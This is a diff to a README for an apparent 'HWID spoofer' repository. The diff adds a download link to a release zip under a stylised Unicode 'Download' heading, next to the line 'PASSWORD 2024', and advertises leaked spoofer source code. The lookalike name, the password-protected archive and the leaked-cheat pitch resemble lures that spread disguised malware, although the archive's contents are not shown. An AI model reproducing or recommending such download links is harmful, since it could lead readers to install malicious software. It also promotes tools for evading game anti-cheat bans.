@@ -1,7 +1,7 @@
 # HWlD-SPOOFER-2024
 
 # PASSWORD 2024 
-## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/Simao11YT/HWlD-SPOOFER-2024/releases/download/HWlD-SPOOFER-2024/SPOOFER.zip)
 
 # GameWear HWID Spoofer Source Code Leak
 Info
